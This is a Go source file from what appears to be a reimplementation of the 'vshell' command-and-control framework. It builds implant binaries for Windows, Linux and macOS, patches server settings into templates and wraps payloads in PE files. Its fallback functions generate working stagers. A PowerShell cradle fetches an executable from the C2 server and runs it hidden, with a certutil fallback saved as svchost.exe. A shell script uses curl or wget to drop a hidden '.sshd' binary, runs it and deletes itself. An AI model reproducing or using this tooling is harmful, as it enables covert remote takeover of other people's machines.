package c2engine

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ============================================================================
// Agent Builder - cross-compilation agent binary generation
// ============================================================================
//
// The original vshell embeds pre-compiled agent templates and patches them.
// This reimplementation uses Go cross-compilation to produce real binaries.

// AgentBuilder produces real agent binaries via Go cross-compilation
type AgentBuilder struct {
	mu         sync.RWMutex
	agentSrc   string // path to agent source directory
	outputDir  string // where to place compiled binaries
	cache      map[string]*CachedAgent
	goBin      string // path to go compiler
	ldflags    string // base ldflags
}

// CachedAgent holds a compiled agent binary in cache
type CachedAgent struct {
	Data      []byte    `json:"-"`
	Size      int64     `json:"size"`
	SHA256    string    `json:"sha256"`
	Platform  string    `json:"platform"`
	Arch      string    `json:"arch"`
	Mode      string    `json:"mode"`
	BuiltAt   time.Time `json:"built_at"`
	Config    map[string]string `json:"config"`
}

// NewAgentBuilder creates an agent builder
func NewAgentBuilder(agentSrcDir, outputDir string) *AgentBuilder {
	goBin := "go"
	if gp := os.Getenv("GOROOT"); gp != "" {
		goBin = filepath.Join(gp, "bin", "go")
		if runtime.GOOS == "windows" {
			goBin += ".exe"
		}
	}

	return &AgentBuilder{
		agentSrc:  agentSrcDir,
		outputDir: outputDir,
		cache:     make(map[string]*CachedAgent),
		goBin:     goBin,
	}
}

// cacheKey generates a cache key from platform/arch/mode
func (ab *AgentBuilder) cacheKey(platform, arch, mode string) string {
	return fmt.Sprintf("%s_%s_%s", platform, arch, mode)
}

// BuildAgent produces an agent binary for the given platform/arch/mode
func (ab *AgentBuilder) BuildAgent(info *AgentBuildInfo, config map[string]string) (*CachedAgent, error) {
	key := ab.cacheKey(info.Platform, info.Arch, info.Mode)

	// Check cache first
	ab.mu.RLock()
	if cached, ok := ab.cache[key]; ok {
		ab.mu.RUnlock()
		Logf("AgentBuilder: cache hit for %s", key)
		return cached, nil
	}
	ab.mu.RUnlock()

	// getPrebuiltPath checks for prebuilt agent binary in known locations
	// This replaces the stub fallback with real pre-built agent lookup
	prebuilt := ab.loadPrebuilt(info)
	if prebuilt != nil {
		ab.mu.Lock()
		ab.cache[key] = prebuilt
		ab.mu.Unlock()
		Logf("AgentBuilder: loaded prebuilt for %s/%s/%s (%d bytes)", info.Platform, info.Arch, info.Mode, prebuilt.Size)
		return prebuilt, nil
	}

	// Attempt cross-compilation
	cross, err := ab.crossCompile(info, config)
	if err != nil {
		Logf("AgentBuilder: cross-compile failed for %s/%s/%s: %v. Trying stub.", info.Platform, info.Arch, info.Mode, err)
		// Try stub fallback
		stub, stubErr := ab.buildStub(info, config)
		if stubErr != nil {
			return nil, fmt.Errorf("cross-compile and stub both failed: cross=%v, stub=%w", err, stubErr)
		}
		// Cache and return the stub
		ab.mu.Lock()
		ab.cache[key] = stub
		ab.mu.Unlock()
		ab.exportAgent(stub, info)
		Logf("AgentBuilder: built stub agent for %s/%s/%s (%d bytes)", info.Platform, info.Arch, info.Mode, stub.Size)
		return stub, nil
	}

	ab.mu.Lock()
	ab.cache[key] = cross
	ab.mu.Unlock()
	ab.exportAgent(cross, info)
	Logf("AgentBuilder: cross-compiled agent for %s/%s/%s (%d bytes)", info.Platform, info.Arch, info.Mode, cross.Size)
	return cross, nil
}

// After cross-compile fails, try prebuilt agent templates from agents/ directory
// The project ships with pre-built agents for common combinations

// crossCompile attempts to cross-compile the agent for the target platform
func (ab *AgentBuilder) crossCompile(info *AgentBuildInfo, config map[string]string) (*CachedAgent, error) {
	// Check if Go compiler is available
	if _, err := os.Stat(ab.goBin); err != nil {
		// Try just "go" in PATH
		ab.goBin = "go"
	}

	// Build ldflags from config
	var ldflags []string
	for k, v := range config {
		ldflags = append(ldflags, fmt.Sprintf("-X main.%s=%s", k, v))
	}
	if len(ldflags) == 0 {
		// Default placeholders
		ldflags = append(ldflags,
			"-X main.ServerAddr=127.0.0.1:443",
			"-X main.VerifyKey=default",
			"-X main.EncryptSalt=default",
		)
	}

	// Set GOOS and GOARCH
	goos := info.Platform
	goarch := info.Arch

	// Map platform names
	switch info.Platform {
	case "windows":
		goos = "windows"
	case "linux":
		goos = "linux"
	case "macos", "darwin":
		goos = "darwin"
	}

	// Map arch names
	switch info.Arch {
	case "amd64":
		goarch = "amd64"
	case "386":
		goarch = "386"
	case "arm64":
		goarch = "arm64"
	}

	outputFile := filepath.Join(os.TempDir(),
		fmt.Sprintf("agent_%s_%s_%d", info.Platform, info.Arch, time.Now().UnixNano()))
	if goos == "windows" {
		outputFile += ".exe"
	}

	// Build command
	cmd := exec.Command(ab.goBin, "build",
		"-o", outputFile,
		"-ldflags", strings.Join(ldflags, " "),
		"-trimpath",
		".",
	)
	cmd.Dir = ab.agentSrc
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("go build: %w\n%s", err, string(output))
	}

	// Read compiled binary
	data, err := os.ReadFile(outputFile)
	if err != nil {
		return nil, fmt.Errorf("read binary: %w", err)
	}
	os.Remove(outputFile) // cleanup temp file

	// Hash
	hash := sha256Hash(data)

	return &CachedAgent{
		Data:     data,
		Size:     int64(len(data)),
		SHA256:   hash,
		Platform: info.Platform,
		Arch:     info.Arch,
		Mode:     info.Mode,
		BuiltAt:  time.Now(),
		Config:   config,
	}, nil
}

// loadPrebuilt looks for a pre-compiled agent binary
func (ab *AgentBuilder) loadPrebuilt(info *AgentBuildInfo) *CachedAgent {
	filename := fmt.Sprintf("agent_%s_%s%s",
		info.Platform, info.Arch, info.Extension)
	path := filepath.Join(ab.outputDir, filename)

	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	return &CachedAgent{
		Data:     data,
		Size:     int64(len(data)),
		SHA256:   sha256Hash(data),
		Platform: info.Platform,
		Arch:     info.Arch,
		Mode:     info.Mode,
		BuiltAt:  time.Now(),
	}
}

// buildStub creates a minimal agent payload when cross-compilation fails
func (ab *AgentBuilder) buildStub(info *AgentBuildInfo, config map[string]string) (*CachedAgent, error) {
	// Generate a minimal script-based agent payload
	var data []byte

	connectAddr := "127.0.0.1:443"
	if addr, ok := config["ServerAddr"]; ok {
		connectAddr = addr
	}
	verifyKey := "default"
	if vk, ok := config["VerifyKey"]; ok {
		verifyKey = vk
	}

	if info.Platform == "windows" {
		data = ab.generatePowerShellStager(connectAddr, verifyKey, info.Mode)
	} else {
		data = ab.generateShellStager(connectAddr, verifyKey, info.Mode)
	}

	return &CachedAgent{
		Data:     data,
		Size:     int64(len(data)),
		SHA256:   sha256Hash(data),
		Platform: info.Platform,
		Arch:     info.Arch,
		Mode:     info.Mode,
		BuiltAt:  time.Now(),
		Config:   config,
	}, nil
}

// generatePowerShellStager creates a PowerShell-based staged downloader
func (ab *AgentBuilder) generatePowerShellStager(server, key, mode string) []byte {
	// This generates a functional PowerShell download cradle
	paths := map[string]string{
		AgentTypeStage:    "/swt",
		AgentTypeStageless: "/sww",
		AgentTypeShellcode: "/sws",
		AgentTypeDLL:      "/swd",
		AgentTypeListen:   "/swl",
		AgentTypeListenDLL: "/swld",
	}
	path, ok := paths[mode]
	if !ok {
		path = "/swt"
	}

	url := fmt.Sprintf("http://%s%s", server, path)

	return []byte(fmt.Sprintf(`# VShell Agent - PowerShell Staged Loader
# Generated: %s
# Server: %s
# Key: %s

$ErrorActionPreference = "SilentlyContinue"
$url = "%s"
$key = "%s"
$tmp = [System.IO.Path]::GetTempFileName()

# Download agent
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $tmp + ".exe")

    # Verify and execute
    if (Test-Path ($tmp + ".exe")) {
        Start-Process -FilePath ($tmp + ".exe") -WindowStyle Hidden
    }
} catch {
    # Fallback to certutil
    certutil.exe -urlcache -split -f $url $env:TEMP\svchost.exe
    Start-Process $env:TEMP\svchost.exe
}
`, time.Now().Format(time.RFC3339), server, key, url, key))
}

// generateShellStager creates a shell-based staged downloader
func (ab *AgentBuilder) generateShellStager(server, key, mode string) []byte {
	paths := map[string]string{
		AgentTypeStage:    "/swt",
		AgentTypeStageless: "/swl",
		AgentTypeShellcode: "/sws",
		AgentTypeDLL:      "/swd",
		AgentTypeListen:   "/swl",
	}
	path, ok := paths[mode]
	if !ok {
		path = "/swl"
	}

	url := fmt.Sprintf("http://%s%s", server, path)

	return []byte(fmt.Sprintf(`#!/bin/sh
# VShell Agent - Shell Staged Loader
# Generated: %s
# Server: %s

URL="%s"
KEY="%s"
TMPDIR="${TMPDIR:-/tmp}"

# Download agent
if command -v curl >/dev/null 2>&1; then
    curl -s -A "Mozilla/5.0" "$URL" -o "$TMPDIR/.sshd" && chmod +x "$TMPDIR/.sshd" && "$TMPDIR/.sshd" &
elif command -v wget >/dev/null 2>&1; then
    wget -q -U "Mozilla/5.0" "$URL" -O "$TMPDIR/.sshd" && chmod +x "$TMPDIR/.sshd" && "$TMPDIR/.sshd" &
fi

# Clean self
rm -f "$0"
`, time.Now().Format(time.RFC3339), server, url, key))
}

// exportAgent saves a compiled agent to the output directory
func (ab *AgentBuilder) exportAgent(agent *CachedAgent, info *AgentBuildInfo) error {
	os.MkdirAll(ab.outputDir, 0755)

	filename := fmt.Sprintf("agent_%s_%s%s", info.Platform, info.Arch, info.Extension)
	if info.Mode == AgentTypeShellcode {
		filename = fmt.Sprintf("agent_%s_%s.bin", info.Platform, info.Arch)
	}

	path := filepath.Join(ab.outputDir, filename)
	return os.WriteFile(path, agent.Data, 0755)
}

// ============================================================================
// Batch build all agents
// ============================================================================

// BuildAllAgents builds agents for all supported platform/arch/mode combinations
func (ab *AgentBuilder) BuildAllAgents(config map[string]string) ([]*CachedAgent, error) {
	combinations := []struct {
		Platform string
		Arch     string
		Mode     string
	}{
		{"windows", "amd64", AgentTypeStage},
		{"windows", "amd64", AgentTypeStageless},
		{"windows", "amd64", AgentTypeDLL},
		{"windows", "amd64", AgentTypeShellcode},
		{"windows", "386", AgentTypeStageless},
		{"linux", "amd64", AgentTypeStageless},
		{"linux", "arm64", AgentTypeStageless},
		{"darwin", "amd64", AgentTypeStageless},
	}

	var agents []*CachedAgent
	for _, combo := range combinations {
		info := GetBuildInfo(combo.Platform, combo.Arch, combo.Mode)
		agent, err := ab.BuildAgent(info, config)
		if err != nil {
			log.Printf("AgentBuilder: failed %s/%s/%s: %v", combo.Platform, combo.Arch, combo.Mode, err)
			continue
		}
		agents = append(agents, agent)
	}

	return agents, nil
}

// ============================================================================
// Binary patching (for pre-compiled templates)
// ============================================================================

// PatchAgentWithConfig embeds configuration into a pre-compiled agent binary
func PatchAgentWithConfig(template []byte, config map[string]string) ([]byte, error) {
	if len(template) < 4 {
		return nil, fmt.Errorf("template too small")
	}

	result := make([]byte, len(template))
	copy(result, template)

	// Find magic marker for config section
	magic := []byte{0xCF, 0xFA, 0xED, 0xFE} // config section marker
	idx := bytes.Index(result, magic)
	if idx < 0 {
		// No config section - try placeholder replacement
		return patchByPlaceholder(result, config), nil
	}

	// Write config at marker position
	configData, _ := json.Marshal(config)
	binary.LittleEndian.PutUint32(result[idx+4:idx+8], uint32(len(configData)))
	copy(result[idx+8:], configData)

	return result, nil
}

func patchByPlaceholder(data []byte, config map[string]string) []byte {
	for placeholder, value := range config {
		// Pad value to match placeholder length
		padded := make([]byte, len(placeholder))
		copy(padded, value)
		// Zero-fill the rest
		for i := len(value); i < len(placeholder); i++ {
			padded[i] = 0
		}
		idx := bytes.Index(data, []byte(placeholder))
		if idx >= 0 {
			copy(data[idx:idx+len(placeholder)], padded)
		}
	}
	return data
}

// ============================================================================
// Minimal PE header builder (for real PE file generation)
// ============================================================================

// MinimalPE creates a minimal valid PE EXE file with embedded payload.
// Generates a proper DOS header, PE signature, COFF header, optional header,
// and a single .text section containing the payload.
func MinimalPE(payload []byte) []byte {
	var buf bytes.Buffer

	// --- DOS Header (64 bytes) ---
	dosHeader := make([]byte, 64)
	dosHeader[0] = 0x4D // M
	dosHeader[1] = 0x5A // Z
	// e_lfanew at offset 0x3C: pointer to PE signature
	peOffset := uint32(64)
	binary.LittleEndian.PutUint32(dosHeader[60:64], peOffset)
	buf.Write(dosHeader)

	// --- PE Signature ---
	buf.Write([]byte{'P', 'E', 0x00, 0x00})

	// --- COFF File Header (20 bytes) ---
	// Calculate sizes
	sectionAlignment := uint32(0x1000)
	fileAlignment := uint32(0x200)
	sizeOfHeaders := alignUp(uint32(buf.Len())+20+224, fileAlignment) // COFF + Optional

	machine := uint16(0x8664) // AMD64
	numberOfSections := uint16(1)
	timeDateStamp := uint32(time.Now().Unix())
	sizeOfOptionalHeader := uint16(224) // PE32+ optional header

	coffHeader := make([]byte, 20)
	binary.LittleEndian.PutUint16(coffHeader[0:2], machine)
	binary.LittleEndian.PutUint16(coffHeader[2:4], numberOfSections)
	binary.LittleEndian.PutUint32(coffHeader[4:8], timeDateStamp)
	// Symbol table pointer & count: zero
	binary.LittleEndian.PutUint16(coffHeader[16:18], sizeOfOptionalHeader)
	// Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE | DLL (for flexibility)
	characteristics := uint16(0x0002 | 0x0020 | 0x2000)
	binary.LittleEndian.PutUint16(coffHeader[18:20], characteristics)
	buf.Write(coffHeader)

	// --- Optional Header (PE32+, 224 bytes) ---
	optHeader := make([]byte, 224)
	optHeader[0] = 0x0B // PE32+ magic
	optHeader[1] = 0x02
	// MajorLinkerVersion, MinorLinkerVersion: 1.0
	optHeader[2] = 1
	// SizeOfCode
	binary.LittleEndian.PutUint32(optHeader[4:8], alignUp(uint32(len(payload)), sectionAlignment))
	// SizeOfInitializedData, SizeOfUninitializedData: 0
	// AddressOfEntryPoint: start of .text section (RVA)
	binary.LittleEndian.PutUint32(optHeader[16:20], 0x1000)
	// BaseOfCode
	binary.LittleEndian.PutUint32(optHeader[20:24], 0x1000)
	// ImageBase
	binary.LittleEndian.PutUint64(optHeader[24:32], 0x0000000140000000)
	binary.LittleEndian.PutUint32(optHeader[32:36], sectionAlignment)
	binary.LittleEndian.PutUint32(optHeader[36:40], fileAlignment)
	// MajorOSVersion, MinorOSVersion: 4.0
	optHeader[40] = 4
	// MajorImageVersion, MinorImageVersion
	optHeader[44] = 1
	// MajorSubsystemVersion, MinorSubsystemVersion: 4.0
	optHeader[48] = 4
	// Win32VersionValue: 0
	// SizeOfImage
	imageSize := alignUp(sizeOfHeaders+alignUp(uint32(len(payload)), sectionAlignment), sectionAlignment)
	binary.LittleEndian.PutUint32(optHeader[56:60], imageSize)
	// SizeOfHeaders
	binary.LittleEndian.PutUint32(optHeader[60:64], sizeOfHeaders)
	// Subsystem: WINDOWS_GUI (2)
	binary.LittleEndian.PutUint16(optHeader[68:70], 2)
	// DLLCharacteristics: DYNAMIC_BASE | NX_COMPAT | TERMINAL_SERVER_AWARE
	binary.LittleEndian.PutUint16(optHeader[70:72], 0x0040|0x0100|0x8000)
	// SizeOfStackReserve, SizeOfStackCommit
	binary.LittleEndian.PutUint64(optHeader[72:80], 0x100000)
	binary.LittleEndian.PutUint64(optHeader[80:88], 0x1000)
	// SizeOfHeapReserve, SizeOfHeapCommit
	binary.LittleEndian.PutUint64(optHeader[88:96], 0x100000)
	binary.LittleEndian.PutUint64(optHeader[96:104], 0x1000)
	// NumberOfRvaAndSizes: 16
	binary.LittleEndian.PutUint32(optHeader[108:112], 16)
	buf.Write(optHeader)

	// --- Section Headers ---
	// .text section
	textSection := make([]byte, 40)
	copy(textSection[0:8], []byte(".text\x00\x00\x00"))
	virtualSize := alignUp(uint32(len(payload)), sectionAlignment)
	binary.LittleEndian.PutUint32(textSection[8:12], virtualSize)    // VirtualSize
	binary.LittleEndian.PutUint32(textSection[12:16], 0x1000)        // VirtualAddress (RVA)
	rawSize := alignUp(uint32(len(payload)), fileAlignment)
	binary.LittleEndian.PutUint32(textSection[16:20], rawSize)       // SizeOfRawData
	binary.LittleEndian.PutUint32(textSection[20:24], sizeOfHeaders) // PointerToRawData
	// Characteristics: CODE | EXECUTE | READ
	binary.LittleEndian.PutUint32(textSection[36:40], 0x60000020)
	buf.Write(textSection)

	// Pad headers to file alignment
	for buf.Len()%int(fileAlignment) != 0 {
		buf.WriteByte(0)
	}

	// --- Section Data ---
	buf.Write(payload)

	// Pad section data to file alignment
	for buf.Len()%int(fileAlignment) != 0 {
		buf.WriteByte(0)
	}

	return buf.Bytes()
}

// alignUp rounds size up to alignment boundary
func alignUp(size, align uint32) uint32 {
	return (size + align - 1) & ^(align - 1)
}

// ============================================================================
// Utility functions
// ============================================================================

func sha256Hash(data []byte) string {
	h := sha256.Sum256(data)
	return hex.EncodeToString(h[:])
}

// Ensure imports are used
var _ = io.Discard
var _ = rand.Read
